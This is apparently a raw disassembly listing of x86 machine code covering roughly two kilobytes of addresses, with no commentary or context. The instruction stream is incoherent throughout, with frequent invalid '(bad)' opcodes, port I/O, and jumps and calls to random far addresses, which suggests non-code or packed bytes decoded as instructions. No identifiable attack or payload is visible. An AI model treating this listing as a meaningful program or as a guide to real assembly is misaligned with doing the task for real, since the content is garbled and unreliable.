  427531:	mov    ebp,0xefebe5ad
  427536:	(bad)
  427539:	loopne 0x427532
  42753b:	jmp    0xd3ee:0xdbd2fef7
  427542:	(bad)  
  427544:	stc    
  427545:	(bad)  
  427546:	neg    edx
  427548:	out    0xc9,al
  42754a:	out    0xc5,al
  42754c:	loopne 0x427554
  42754e:	jmp    0xe8bc:0xa8cdb307
  427555:	mov    dl,0xe6
  427557:	cli    
  427558:	rcr    ebx,1
  42755a:	xlat   BYTE PTR ds:[ebx]
  42755b:	std    
  42755c:	(bad)  
  42755d:	xlat   BYTE PTR ds:[ebx]
  42755e:	mov    ebx,0xb8faccb9
  427563:	mov    ah,0xff
  427565:	xlat   BYTE PTR ds:[ebx]
  427566:	(bad)  
  427568:	aad    0xfb
  42756a:	or     cl,bl
  42756c:	cld    
  42756d:	in     al,0xed
  42756f:	out    0xd3,eax
  427571:	call   0xc5053a33
  427576:	rol    bh,1
  427578:	out    0xdb,eax
  42757a:	(bad)  
  42757b:	mov    ebx,0xd903bce5
  427580:	add    edi,ebp
  427582:	aad    0xf6
  427584:	sti    
  427585:	in     eax,0xe0
  427587:	out    0xc2,eax
  427589:	sti    
  42758a:	cmc    
  42758b:	loop   0x427591
  42758d:	or     bl,ch
  42758f:	loop   0x42756f
  427591:	test   al,0xc2
  427593:	ret    
  427594:	into   
  427595:	enter  0xf4f7,0xb2
  427599:	in     al,dx
  42759a:	div    DWORD PTR [esi-0x320d3323]
  4275a0:	repz mov esi,0xd3de0006
  4275a6:	idiv   ebx
  4275a8:	out    0xde,eax
  4275aa:	fadd   st,st(0)
  4275ac:	cli    
  4275ad:	jmp    0xb6e9:0xcca7dcda
  4275b4:	mov    dh,0xf6
  4275b6:	(bad)  
  4275b7:	retf   0xd9af
  4275ba:	(bad)  
  4275bb:	retf   
  4275bc:	mov    ebp,0xb9ddbed5
  4275c1:	fucom  st(6)
  4275c3:	fadd   st(0),st
  4275c5:	(bad)  
  4275c7:	loop   0x42758b
  4275c9:	hlt    
  4275ca:	add    esp,edx
  4275cc:	jmp    0xde1579b2
  4275d1:	mov    cl,0xc1
  4275d3:	ret    0xe6b3
  4275d6:	(bad)  
  4275d8:	icebp  
  4275d9:	loopne 0x4275ae
  4275db:	xlat   BYTE PTR ds:[ebx]
  4275dc:	shl    bl,1
  4275de:	int3   
  4275df:	mov    eax,0xdac0d3be
  4275e4:	div    cl
  4275e6:	or     bl,bl
  4275e8:	add    al,0xd7
  4275ea:	out    dx,al
  4275eb:	cld    
  4275ec:	add    eax,0xcafeebce
  4275f1:	test   al,0xb2
  4275f3:	jecxz  0x4275b7
  4275f5:	jecxz  0x4275e2
  4275f7:	(bad)  
  4275f8:	cmc    
  4275f9:	stc    
  4275fa:	test   ebp,0xfcb8cbf7
  427600:	call   0xdb3076bd
  427605:	(bad)  
  427606:	or     dh,cl
  427608:	retf   
  427609:	in     eax,0xd4
  42760b:	add    al,0xed
  42760d:	fcmovu st,st(3)
  42760f:	retf   
  427610:	out    0xb8,eax
  427612:	(bad)
  427615:	rol    ah,0xd0
  427618:	retf   0xc6ed
  42761b:	mov    ebx,0xf7cdb2ea
  427620:	mov    esp,0xfad4dbf5
  427625:	add    eax,0x5c2dad7
  42762a:	jmp    0xbfe9:0xe3e60703
  427631:	in     al,0xc5
  427633:	in     al,0xb0
  427635:	lods   eax,DWORD PTR ds:[esi]
  427636:	mov    ch,0xee
  427638:	icebp  
  427639:	aam    0xd1
  42763b:	in     eax,0xf5
  42763d:	mov    esp,0xd0dbe8fa
  427642:	jecxz  0x427645
  427644:	mov    ebp,0xf5dafdd9
  427649:	(bad)  [ecx]
  42764b:	hlt    
  42764c:	leave  
  42764d:	cld    
  42764e:	fcmove st,st(1)
  427650:	test   eax,0xbcb0ceeb
  427655:	mov    dl,0xfb
  427657:	int3   
  427658:	aad    0xd6
  42765a:	fcmove st,st(5)
  42765c:	in     eax,dx
  42765d:	repz cli 
  42765f:	fnstcw WORD PTR [ebp-0x5471327]
  427665:	repz (bad) 
  427667:	loope  0x427645
  427669:	(bad)  
  42766a:	out    0xef,eax
  42766c:	or     ebp,edi
  42766e:	out    0xdf,al
  427670:	lock into 
  427672:	mov    dl,0xac
  427674:	(bad)  
  427675:	frstpm(287 only) 
  427677:	rol    ah,cl
  427679:	mov    cl,0xd1
  42767b:	sti    
  42767c:	mov    ebp,0xf5bee2b9
  427681:	into   
  427682:	aam    0xd9
  427684:	fcmovnu st,st(7)
  427686:	jmp    0x42766a
  427688:	icebp  
  427689:	push   es
  42768a:	aam    0xf9
  42768c:	add    bh,dl
  42768e:	in     eax,0xcc
  427690:	jmp    0xeed5:0xc3eea8d7
  427697:	in     al,dx
  427698:	mov    ebx,0xfbeeb0fa
  42769d:	mov    ebx,0xf2c9ece9
  4276a2:	in     eax,dx
  4276a3:	repnz add ebx,eax
  4276a6:	lock cld 
  4276a8:	sti    
  4276a9:	add    edi,eax
  4276ab:	add    al,0x0
  4276ad:	or     ebp,edi
  4276af:	adc    cl,al
  4276b1:	out    0xd7,eax
  4276b3:	(bad)  [esi-0x73b0a3a]
  4276b9:	jmp    0x4276b1
  4276bb:	cli    
  4276bc:	neg    ah
  4276be:	sar    ebx,cl
  4276c0:	xlat   BYTE PTR ds:[ebx]
  4276c1:	cli    
  4276c2:	sar    ch,0xe6
  4276c5:	rcl    ebp,cl
  4276c7:	loop   0x4276bf
  4276c9:	call   0x487caa
  4276ce:	int    0xdc
  4276d0:	(bad)  
  4276d1:	mov    al,0xf1
  4276d3:	shl    ah,cl
  4276d5:	mov    ah,0xef
  4276d7:	into   
  4276d8:	mov    ch,0xb0
  4276da:	aad    0xd1
  4276dc:	int3   
  4276dd:	idiv   ah
  4276df:	neg    al
  4276e1:	mov    esp,0xf1e0bcdb
  4276e6:	(bad)  
  4276e8:	push   es
  4276e9:	add    al,0xca
  4276eb:	(bad)  
  4276ed:	out    dx,al
  4276ee:	fisttp DWORD PTR [edi]
  4276f0:	lods   eax,DWORD PTR ds:[esi]
  4276f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276f2:	iret   
  4276f3:	retf   
  4276f4:	ror    dl,0xad
  4276f7:	(bad)  
  4276f8:	lock jmp 0x4276c4
  4276fb:	sti    
  4276fc:	shl    DWORD PTR [esi-0x725253d],cl
  427702:	fsubr  st(5),st
  427704:	add    al,bl
  427706:	add    edx,ecx
  427708:	add    ah,dh
  42770a:	aam    0xca
  42770c:	or     eax,DWORD PTR [edi]
  42770e:	add    esp,ecx
  427710:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427711:	rol    ch,cl
  427713:	cmc    
  427714:	iret   
  427715:	jmp    0xf72f4011
  42771a:	inc    esi
  42771c:	(bad)  
  42771e:	mov    esp,0xc0f4cdf6
  427723:	int    0xfa
  427725:	stc    
  427726:	ret    
  427727:	in     eax,0xf7
  427729:	(bad)  
  42772a:	fcmovu st,st(6)
  42772c:	fmul   st(0),st
  42772e:	pop    es
  42772f:	repz ret 
  427731:	lods   al,BYTE PTR ds:[esi]
  427732:	loop   0x427701
  427734:	mov    dh,0xb5
  427736:	retf   
  427737:	mov    al,0xf4
  427739:	jmp    0xf8f1:0xd7c9e9f1
  427740:	enter  0xf7b9,0xcd
  427744:	sar    al,0xc5
  427747:	(bad)  
  427748:	leave  
  427749:	out    dx,eax
  42774a:	xlat   BYTE PTR ds:[ebx]
  42774b:	fiadd  DWORD PTR [edx]
  42774d:	call   0xb02c5f2e
  427752:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427753:	int    0xc4
  427755:	jecxz  0x427717
  427757:	jmp    0xd3bd:0xd3e7e9c8
  42775e:	mov    ebp,0xd5f7f6f6
  427763:	ret    0xc5fc
  427766:	pop    es
  427767:	fadd   st,st(6)
  427769:	fadd   QWORD PTR [esp+eax*8]
  42776c:	out    dx,al
  42776d:	paddw  mm1,mm4
  427770:	jmp    0xbdf14947
  427775:	mov    bh,0xe4
  427777:	(bad)  
  427778:	loope  0x427747
  42777a:	in     al,0xd2
  42777c:	into   
  42777d:	(bad)  
  42777e:	(bad)  
  42777f:	lock loopne 0x42774a
  427782:	std    
  427783:	(bad)  
  427785:	pop    es
  427786:	ror    ebx,1
  427788:	retf   
  427789:	(bad)  
  42778a:	xlat   BYTE PTR ds:[ebx]
  42778b:	(bad)  
  42778c:	out    dx,eax
  42778d:	leave  
  42778e:	lds    edx,FWORD PTR [ebx]
  427790:	leave  
  427791:	test   eax,0xcdf1ead3
  427796:	repz int 0xf2
  427799:	mov    dl,0xe5
  42779b:	hlt    
  42779c:	mov    ebx,0xbee1edda
  4277a1:	fiadd  WORD PTR [edi]
  4277a3:	int3   
  4277a4:	lock clc 
  4277a6:	repnz (bad) 
  4277a8:	stc    
  4277a9:	(bad)  
  4277ab:	out    dx,al
  4277ac:	add    bh,bh
  4277ae:	into   
  4277af:	out    dx,eax
  4277b0:	mov    cl,0xad
  4277b2:	lods   eax,DWORD PTR ds:[esi]
  4277b3:	ret    
  4277b4:	lods   al,BYTE PTR ds:[esi]
  4277b5:	cmc    
  4277b6:	hlt    
  4277b7:	(bad)  
  4277b8:	mov    ebx,0xdcfaf0b0
  4277bd:	retf   
  4277be:	into   
  4277bf:	cli    
  4277c0:	jecxz  0x427790
  4277c2:	cmc    
  4277c3:	clc    
  4277c4:	pop    es
  4277c5:	repz in eax,0x7
  4277c8:	or     ebp,ebx
  4277ca:	(bad)  
  4277cc:	call   0xc44f85d8
  4277d1:	stos   BYTE PTR es:[edi],al
  4277d2:	int3   
  4277d3:	(bad)
  4277d7:	ret    0xeac8
  4277da:	in     eax,0xff
  4277dc:	mov    eax,0xefd6eace
  4277e1:	ror    edi,0xd2
  4277e4:	loop   0x4277ec
  4277e6:	add    ebp,esi
  4277e8:	inc    BYTE PTR [eax+ebx*8]
  4277eb:	loopne 0x4277c8
  4277ed:	(bad)  
  4277ee:	out    dx,eax
  4277ef:	cli    
  4277f0:	shl    dl,1
  4277f2:	int    0xc2
  4277f4:	out    dx,al
  4277f5:	jmp    0xc6286aaf
  4277fa:	out    dx,eax
  4277fb:	in     al,dx
  4277fc:	div    BYTE PTR [ebp-0x4347fe09]
  427802:	loopne 0x4277e2
  427804:	(bad)  
  427805:	fidivr DWORD PTR [ebp-0x371cf61c]
  42780b:	push   cs
  42780c:	iret   
  42780d:	(bad)  
  42780f:	jmp    0xaef6:0xaedfdec1
  427816:	into   
  427817:	rcl    bl,0xdf
  42781a:	shr    ecx,1
  42781c:	mov    edi,0xe0dbccc4
  427821:	xlat   BYTE PTR ds:[ebx]
  427822:	push   es
  427823:	pop    es
  427824:	(bad)  
  427825:	loop   0x427828
  427827:	fadd   QWORD PTR [edx]
  427829:	hlt    
  42782a:	out    0xc6,al
  42782c:	retf   0xcfea
  42782f:	fcmovb st,st(0)
  427831:	out    dx,eax
  427832:	retf   0xf7f6
  427835:	jmp    0xe4f5:0xece7c0c6
  42783c:	retf   0xe8b2
  42783f:	mov    al,0xfa
  427841:	in     eax,dx
  427842:	clc    
  427843:	fcmovnb st,st(0)
  427845:	add    al,0xe1
  427847:	ret    0xf6eb
  42784a:	fmul   st,st(2)
  42784c:	or     eax,0xd8f9dce6
  427851:	bnd ret 
  427853:	scas   eax,DWORD PTR es:[edi]
  427854:	out    dx,al
  427855:	mul    bh
  427857:	loop   0x42783a
  427859:	shl    ah,0xd3
  42785c:	fbstp  TBYTE PTR [esi-0x432b4230]
  427862:	hlt    
  427863:	xlat   BYTE PTR ds:[ebx]
  427864:	loopne 0x42783c
  427866:	add    esi,eax
  427868:	ret    0xdf04
  42786b:	lds    eax,FWORD PTR [edi]
  42786d:	add    edi,edi
  42786f:	pop    es
  427870:	out    0xaa,eax
  427872:	bnd jmp 0xd1242e34
  427878:	sar    bl,cl
  42787a:	int    0xd2
  42787c:	(bad)  
  42787d:	retf   0xd5ff
  427880:	mov    eax,0xf2bdd8d2
  427885:	int3   
  427886:	fst    st(5)
  427888:	or     DWORD PTR [edi],ecx
  42788a:	add    BYTE PTR ds:0x608efd9,al
  427890:	jmp    0xeaef3e85
  427895:	lods   eax,DWORD PTR ds:[esi]
  427896:	int3   
  427897:	mov    cl,0xc0
  427899:	cli    
  42789a:	mov    ch,0xe8
  42789c:	fxch   st(5)
  42789e:	enter  0xfed2,0xf0
  4278a2:	loopne 0x427895
  4278a4:	cld    
  4278a5:	sti    
  4278a6:	sti    
  4278a7:	add    ch,bl
  4278a9:	fcmovb st,st(1)
  4278ab:	or     dh,ch
  4278ad:	stc    
  4278ae:	out    0x5,al
  4278b0:	out    0xeb,eax
  4278b2:	shl    BYTE PTR [edx-0x57331f30],0xc9
  4278b9:	mov    ah,0xf3
  4278bb:	out    dx,al
  4278bc:	(bad)  
  4278be:	mov    edx,0xd4d2bdfe
  4278c3:	out    0x3,eax
  4278c5:	(bad)  
  4278c6:	ror    BYTE PTR [edx],0xd7
  4278c9:	rcr    edi,0xef
  4278cc:	int    0xde
  4278ce:	(bad)
  4278d2:	ffree  st(4)
  4278d4:	int    0xad
  4278d6:	loope  0x4278c2
  4278d8:	aad    0xc7
  4278da:	mov    al,0xbf
  4278dc:	stc    
  4278dd:	out    dx,al
  4278de:	fdiv   st(0),st
  4278e0:	mov    bh,0xe2
  4278e2:	out    dx,eax
  4278e3:	jecxz  0x4278c0
  4278e5:	add    dh,dl
  4278e7:	fdivr  st,st(5)
  4278e9:	fdiv   st(1),st
  4278eb:	fdivp  st(7),st
  4278ed:	iret   
  4278ee:	bswap  ebp
  4278f0:	in     eax,dx
  4278f1:	loop   0x4278b8
  4278f3:	lods   al,BYTE PTR ds:[esi]
  4278f4:	mov    ch,0xd5
  4278f6:	lods   eax,DWORD PTR ds:[esi]
  4278f7:	loop   0x4278ed
  4278f9:	cli    
  4278fa:	(bad)  
  4278fb:	fcom   st(6)
  4278fd:	in     al,dx
  4278fe:	fdivr  DWORD PTR [edi-0x18324601]
  427904:	aam    0xb
  427906:	shl    ah,cl
  427908:	shl    edi,0xf7
  42790b:	enter  0xefec,0xca
  42790f:	jecxz  0x4278d4
  427911:	(bad)  
  427912:	repz mov bh,0xf7
  427915:	mov    dl,0xb4
  427918:	hlt    
  427919:	int    0xc4
  42791b:	out    dx,eax
  42791c:	jmp    0x4278e7
  42791e:	out    dx,eax
  42791f:	(bad)  
  427921:	mul    ebx
  427923:	add    al,cl
  427925:	aam    0xeb
  427927:	les    edi,FWORD PTR [edi+0x6c9e70a]
  42792d:	loop   0x4278f9
  42792f:	fsubr  QWORD PTR [edx-0x2e343f40]
  427935:	cmc    
  427936:	frstpm(287 only) 
  427938:	sti    
  427939:	repz in eax,0xb0
  42793c:	in     eax,dx
  42793d:	xlat   BYTE PTR ds:[ebx]
  42793e:	add    al,bl
  427940:	icebp  
  427941:	rcl    bl,cl
  427943:	(bad)  
  427944:	fsub   st(3),st
  427946:	fmul   st(3),st
  427948:	fsubr  st(1),st
  42794a:	xlat   BYTE PTR ds:[ebx]
  42794b:	retf   0xc2fd
  42794e:	rcr    esi,cl
  427950:	out    0xde,eax
  427952:	(bad)  
  427954:	ret    0xe6cc
  427957:	not    bl
  427959:	int    0xce
  42795b:	fcomip st,st(2)
  42795d:	add    ebx,ecx
  42795f:	aad    0xe0
  427961:	loopne 0x427938
  427963:	rol    ecx,1
  427965:	or     esp,esi
  427967:	retf   
  427968:	or     cl,ah
  42796a:	call   0xe1b744a
  42796f:	std    
  427970:	loop   0x427924
  427972:	div    edi
  427974:	in     al,dx
  427975:	in     al,0xb7
  427977:	(bad)  
  427978:	out    dx,eax
  427979:	(bad)  
  42797a:	fcmovnbe st,st(1)
  42797c:	retf   
  42797d:	fucomi st,st(0)
  42797f:	stc    
  427980:	(bad)  
  427982:	lock pop es
  427984:	mov    esi,0xe2c7e1c6
  427989:	(bad)  
  42798b:	add    cl,cl
  42798d:	(bad)  
  42798f:	dec    eax
  427991:	fdivr  st(7),st
  427993:	scas   al,BYTE PTR es:[edi]
  427994:	fdivr  st(1),st
  427996:	mov    ah,0xec
  427998:	not    edx
  42799a:	mov    ch,0xf0
  42799c:	iret   
  42799d:	not    bl
  42799f:	(bad)  
  4279a1:	enter  0x3b5,0xf7
  4279a5:	push   es
  4279a6:	sti    
  4279a7:	std    
  4279a8:	or     ebp,edi
  4279aa:	leave  
  4279ab:	stc    
  4279ac:	in     al,dx
  4279ad:	or     eax,0xafdfe1ec
  4279b2:	ret    
  4279b3:	mov    ebp,0xd5e8b0e0
  4279b8:	jmp    0xf2d1:0xd3f6fecc
  4279bf:	cli    
  4279c0:	fild   DWORD PTR [edi]
  4279c2:	sar    DWORD PTR [esi-0x3180d1a],cl
  4279c8:	loopne 0x4279b9
  4279ca:	or     BYTE PTR [edi],al
  4279cc:	std    
  4279cd:	in     eax,dx
  4279ce:	leave  
  4279cf:	int    0xcc
  4279d1:	in     eax,dx
  4279d2:	mov    ebp,0xe8e0d6cc
  4279d7:	mov    ebx,0xe8e5f6cd
  4279dc:	std    
  4279dd:	push   DWORD PTR [edx+ecx*8-0x2823fe]
  4279e4:	(bad)  
  4279e5:	repz clc 
  4279e7:	aad    0xdf
  4279e9:	out    dx,eax
  4279ea:	or     ch,ch
  4279ec:	jecxz  0x4279db
  4279ee:	std    
  4279ef:	loope  0x4279d7
  4279f1:	test   eax,0xc1c8f1b1
  4279f6:	shr    al,1
  4279f8:	mov    ch,0xee
  4279fa:	repz mov eax,0xcce9bbeb
  427a00:	mov    eax,0xc1f7e1ec
  427a05:	repnz test ebx,0xe40afb09
  427a0c:	pop    es
  427a0d:	in     al,0xfa
  427a0f:	retf   
  427a10:	mov    eax,0xf6dcf0f2
  427a15:	out    0xf3,eax
  427a17:	loope  0x4279f9
  427a19:	imul   ch
  427a1b:	fstp   TBYTE PTR [ecx-0x2742344c]
  427a21:	aam    0xf8
  427a23:	mov    edi,0xfae1fcd9
  427a28:	out    0xc2,al
  427a2a:	aam    0xe6
  427a2c:	fiadd  DWORD PTR ds:0xf7d1f9fa
  427a32:	into   
  427a33:	loop   0x4279e7
  427a35:	shr    eax,cl
  427a37:	(bad)  
  427a38:	(bad)  
  427a39:	lock mov bh,0xe5
  427a3c:	imul   ebp
  427a3e:	iret   
  427a3f:	int    0xe0
  427a41:	inc    BYTE PTR [ecx]
  427a43:	(bad)  
  427a44:	loop   0x427a2d
  427a46:	ret    0xf5d9
  427a49:	aam    0xf9
  427a4b:	pop    es
  427a4c:	call   DWORD PTR [ebx]
  427a4e:	add    al,0xdf
  427a50:	call   0xce093242
  427a55:	out    dx,al
  427a56:	call   0xef1d530c
  427a5b:	fmul   st,st(0)
  427a5d:	lock add ebp,esp
  427a60:	loop   0x427a1e
  427a62:	rol    BYTE PTR [ecx],cl
  427a64:	ret    0xd5db
  427a67:	ror    DWORD PTR [eax],1
  427a69:	jmp    0xa:0x80fd6f8
  427a70:	ret    0xcbe4
  427a73:	leave  
  427a74:	iret   
  427a75:	loope  0x427a5a
  427a77:	repz aad 0xdf
  427a7a:	mov    bh,0xd0
  427a7c:	retf   0xd9f9
  427a7f:	(bad)  
  427a80:	fistp  QWORD PTR [eax-0x2b212925]
  427a86:	mov    esp,0xd8dcfdd4
  427a8b:	lds    eax,FWORD PTR [ecx]
  427a8d:	int    0xdd
  427a8f:	leave  
  427a90:	out    0xde,al
  427a92:	test   eax,0xfbaed7c8
  427a97:	ret    0xb0ce
  427a9a:	(bad)  
  427a9b:	out    dx,eax
  427a9c:	iret   
  427a9d:	in     al,0xec
  427a9f:	icebp  
  427aa0:	fistp  QWORD PTR [esi-0x391e284b]
  427aa6:	icebp  
  427aa7:	inc    eax
  427aa9:	add    edi,esp
  427aab:	jecxz  0x427a88
  427aad:	loopne 0x427aab
  427aaf:	out    0xb8,eax
  427ab1:	mov    ebp,0xd4d4f5cd
  427ab6:	rcr    ebx,cl
  427ab8:	mov    ch,0xf7
  427aba:	fdivr  DWORD PTR [ebx-0x2f1c2233]
  427ac0:	not    edx
  427ac2:	icebp  
  427ac3:	add    esi,ebx
  427ac5:	add    al,0xd1
  427ac7:	retf   
  427ac8:	fdiv   st,st(7)
  427aca:	out    0xfc,al
  427acc:	loopne 0x427ad1
  427ace:	push   es
  427acf:	fmul   st,st(2)
  427ad1:	into   
  427ad2:	shr    eax,1
  427ad4:	mov    bh,0xad
  427ad6:	rol    edi,0xb3
  427ad9:	(bad)  
  427ada:	(bad)  [esi-0x130d2e4a]
  427ae0:	fcom   st(0)
  427ae2:	iret   
  427ae3:	fadd   st,st(2)
  427ae5:	add    eax,0xdbc4e3d1
  427aea:	frstpm(287 only) 
  427aec:	(bad)  
  427aee:	in     al,dx
  427aef:	stc    
  427af0:	fst    st(0)
  427af2:	fmulp  st(7),st
  427af4:	stos   DWORD PTR es:[edi],eax
  427af5:	int3   
  427af6:	mov    dh,0xc1
  427af8:	mov    ah,0xb8
  427afa:	iret   
  427afb:	out    0xca,al
  427afd:	fcom   st(0)
  427aff:	idiv   DWORD PTR [edx-0x382f294a]
  427b05:	mul    dh
  427b07:	loopne 0x427afd
  427b09:	div    esp
  427b0b:	mov    esp,0xcae8eadd
  427b10:	sar    BYTE PTR [edi-0x4c4a0c10],cl
  427b16:	mov    ah,0xca
  427b18:	idiv   BYTE PTR [ebx-0xc222514]
  427b1e:	mov    edi,0xd5ffe2dc
  427b23:	jecxz  0x427ae7
  427b25:	loope  0x427b04
  427b27:	shl    bh,0xc6
  427b2a:	add    eax,0xcce2e0bc
  427b2f:	jmp    0x427adb
  427b31:	test   eax,0xc5e3b1e7
  427b36:	mov    bh,0xac
  427b38:	mov    bl,0xba
  427b3a:	aad    0xfd
  427b3c:	jmp    0xfeff7b0a
  427b41:	mov    esp,0xf0d3c1f4
  427b46:	sti    
  427b47:	inc    al
  427b49:	aam    0xfe
  427b4b:	clc    
  427b4c:	jecxz  0x427b57
  427b4e:	repz repz retf 0xafed
  427b53:	in     al,dx
  427b54:	in     eax,0xf4
  427b56:	loopne 0x427b40
  427b58:	aam    0xd3
  427b5a:	(bad)
  427b5d:	retf   0xe8bb
  427b60:	fistp  QWORD PTR [ebp-0x70f2741]
  427b66:	rcr    cl,1
  427b68:	jmp    0xfa3f8034
  427b6d:	add    ebp,edi
  427b6f:	out    0xf3,al
  427b71:	into   
  427b72:	lods   al,BYTE PTR ds:[esi]
  427b73:	scas   al,BYTE PTR es:[edi]
  427b74:	test   esi,0xeed3f7c3
  427b7a:	out    dx,al
  427b7b:	repnz jmp 0xe3ed:0xcecaddf9
  427b83:	add    ah,bh
  427b85:	stc    
  427b86:	rol    eax,1
  427b88:	or     BYTE PTR [eax],al
  427b8a:	(bad)  
  427b8b:	enter  0x9ed,0xde
  427b8f:	or     ebx,edx
  427b91:	(bad)
  427b95:	jmp    0xdff95195
  427b9a:	fdiv   st,st(2)
  427b9c:	iret   
  427b9d:	mov    esp,0xdaf8baff
  427ba2:	mov    ch,0xd4
  427ba4:	(bad)  
  427ba5:	loopne 0x427b7b
  427ba7:	(bad)  
  427ba9:	jmp    0xda507977
  427bae:	add    ebp,ecx
  427bb0:	loope  0x427b93
  427bb2:	int3   
  427bb3:	enter  0xf2b1,0xce
  427bb7:	loope  0x427b99
  427bb9:	jmp    0x427bb5
  427bbb:	mov    ch,0xcc
  427bbd:	out    dx,al
  427bbe:	mov    cl,0xc9
  427bc0:	mov    ecx,0xddd7e7f6
  427bc5:	mov    edx,0xfbd1fcf1
  427bca:	fdivp  st(3),st
  427bcc:	lds    eax,FWORD PTR [ebx]
  427bce:	add    BYTE PTR [eax],al
  427bd0:	fsubr  QWORD PTR [eax-0x434f3624]
  427bd6:	vpaddq xmm6,xmm6,XMMWORD PTR [edi-0x2b071246]
  427bde:	icebp  
  427bdf:	loop   0x427bad
  427be1:	mov    esi,0xfbdd07d0
  427be6:	icebp  
  427be7:	retf   0xd7f4
  427bea:	out    0xfe,al
  427bec:	loopne 0x427be2
  427bee:	out    0xcb,eax
  427bf0:	out    dx,al
  427bf1:	out    0xd0,al
  427bf3:	(bad)
  427bf6:	call   0xbbf92fd4
  427bfb:	retf   0xbfb4
  427bfe:	fdivr  st(6),st
  427c00:	ret    
  427c01:	fcmovu st,st(4)
  427c03:	shl    bh,cl
  427c05:	or     esi,ecx
  427c07:	stc    
  427c08:	(bad)  
  427c09:	out    dx,eax
  427c0a:	call   0xf31c5110
  427c0f:	adc    ebx,esp
  427c11:	lock fnstsw WORD PTR [ebp-0x6300c0e]
  427c18:	int3   
  427c19:	lds    ebp,FWORD PTR [ebp-0x2a172350]
  427c1f:	test   esi,0xf9edffc8
  427c25:	(bad)  
  427c26:	loop   0x427c23
  427c28:	idiv   DWORD PTR [esi-0x33fc36fd]
  427c2e:	or     cl,BYTE PTR [edx]
  427c30:	int    0xe3
  427c32:	jmp    0xb4f6:0xd5b7f2b2
  427c39:	rcl    edi,1
  427c3b:	mov    ah,0xca
  427c3d:	(bad)  
  427c3e:	repz (bad) 
  427c40:	hlt    
  427c41:	shl    al,1
  427c43:	out    0xe1,al
  427c45:	shl    ecx,0xa
  427c48:	fyl2xp1 
  427c4a:	shl    dh,0xef
  427c4d:	add    cl,dl
  427c4f:	add    ebx,eax
  427c51:	jecxz  0x427c1d
  427c53:	retf   
  427c54:	rcl    ebx,cl
  427c56:	cmc    
  427c57:	out    0xee,al
  427c59:	stc    
  427c5a:	into   
  427c5b:	mov    al,0xea
  427c5d:	in     eax,dx
  427c5e:	aam    0xcd
  427c60:	in     al,dx
  427c61:	ret    
  427c62:	add    al,bl
  427c64:	aad    0xf1
  427c66:	sti    
  427c67:	(bad)  
  427c68:	loopne 0x427c55
  427c6a:	clc    
  427c6b:	stc    
  427c6c:	std    
  427c6d:	add    cl,BYTE PTR [esi]
  427c6f:	pandn  mm5,QWORD PTR [ecx-0x1b3b1d50]
  427c76:	leave  
  427c77:	loop   0x427c44
  427c79:	int3   
  427c7a:	shr    cl,1
  427c7c:	test   ebx,0xd8d7d7c8
  427c82:	icebp  
  427c83:	(bad)  
  427c84:	mov    edi,0xf6fdf8c6
  427c89:	fisttp WORD PTR [eax]
  427c8b:	or     ah,al
  427c8d:	or     bl,dl
  427c8f:	adc    esi,eax
  427c91:	out    dx,al
  427c92:	shr    edx,0xb6
  427c95:	call   0xe62d464d
  427c9a:	mov    ah,0xd8
  427c9c:	in     al,dx
  427c9d:	fcmovnbe st,st(4)
  427c9f:	test   cl,0xef
  427ca2:	sar    BYTE PTR [esi+0x1df0bf1],cl
  427ca8:	call   0xfd44488b
  427cad:	les    ecx,FWORD PTR [ebx]
  427caf:	push   es
  427cb0:	loop   0x427c9c
  427cb2:	loopne 0x427c72
  427cb4:	iret   
  427cb5:	loopne 0x427c67
  427cb7:	out    dx,eax
  427cb8:	retf   
  427cb9:	repz fxch st(1)
  427cbc:	idiv   DWORD PTR [ecx-0x270c3142]
  427cc2:	cld    
  427cc3:	shl    cl,0xc6
  427cc6:	jmp    0x427cb3
  427cc8:	fld    DWORD PTR [ecx]
  427cca:	pop    es
  427ccb:	jmp    0x427cd9
  427ccd:	out    0xcb,al
  427ccf:	clc    
  427cd0:	out    0xc7,eax
  427cd2:	retf   
  427cd3:	(bad)  
  427cd4:	leave  
  427cd5:	out    dx,eax
  427cd6:	lods   eax,DWORD PTR ds:[esi]
  427cd7:	mov    ah,0xed
  427cd9:	iret   
  427cda:	mov    ecx,0xc8eeb3ac
  427cdf:	imul   bh
  427ce1:	ret    0xd4ed
  427ce4:	fidivr DWORD PTR [ecx+esi*8-0x3a411c0b]
  427ceb:	jmp    0x82179d0
  427cf0:	ror    ah,cl
  427cf2:	int3   
  427cf3:	shr    esi,cl
  427cf5:	leave  
  427cf6:	retf   
  427cf7:	sti    
  427cf8:	in     al,dx
  427cf9:	scas   al,BYTE PTR es:[edi]
  427cfa:	in     eax,dx
  427cfb:	out    dx,al
  427cfc:	mov    dh,0xfa
  427cfe:	retf   
  427cff:	ret    
  427d00:	idiv   ch
  427d02:	(bad)  
  427d04:	fidivr DWORD PTR [esi+0x70606f4]
  427d0a:	out    dx,eax
  427d0b:	enter  0xcbd4,0xeb
  427d0f:	pandn  mm3,mm6
  427d12:	icebp  
  427d13:	(bad)  
  427d14:	mov    dh,0xeb
  427d16:	in     al,dx
  427d17:	rcl    esp,cl
  427d19:	int3   
  427d1a:	mov    ecx,0xfad6fde8
  427d1f:	fcmovnbe st,st(0)
  427d21:	ror    ch,cl
  427d23:	(bad)  
  427d24:	jecxz  0x427d29
  427d26:	in     al,0xa
  427d28:	loop   0x427ceb
  427d2a:	out    0x0,al
  427d2c:	iret   
  427d2d:	ret    0xe00f
  427d30:	jmp    0xcaee:0xc7ccecbc
  427d37:	sti    
  427d38:	div    DWORD PTR [ebp+ebp*4-0x35362a06]
  427d3f:	iret   
  427d40:	fstp   TBYTE PTR [ebp-0x45094306]
  427d46:	fcomi  st,st(6)
  427d48:	loope  0x427d0c
  427d4a:	or     DWORD PTR [ecx],eax
  427d4c:	add    eax,0xd1ef040f
  427d51:	mov    al,0xbe
  427d53:	shl    DWORD PTR [ecx-0x81b1829],0xb5
  427d5a:	stc    
  427d5b:	icebp  
  427d5c:	mov    edi,0xf6e2fad4
  427d61:	add    ah,dh
  427d63:	fcomi  st,st(5)
  427d65:	add    esi,edx
  427d67:	icebp  
  427d68:	in     eax,0xf5
  427d6a:	out    0xfa,eax
  427d6c:	into   
  427d6d:	retf   
  427d6e:	cld    
  427d6f:	cli    
  427d70:	jecxz  0x427d35
  427d72:	out    0xf2,eax
  427d74:	jmp    0x427d27
  427d76:	enter  0xe8c7,0xd6
  427d7a:	leave  
  427d7b:	repnz out dx,al
  427d7d:	out    dx,eax
  427d7e:	mov    esi,0x7f9d2cc
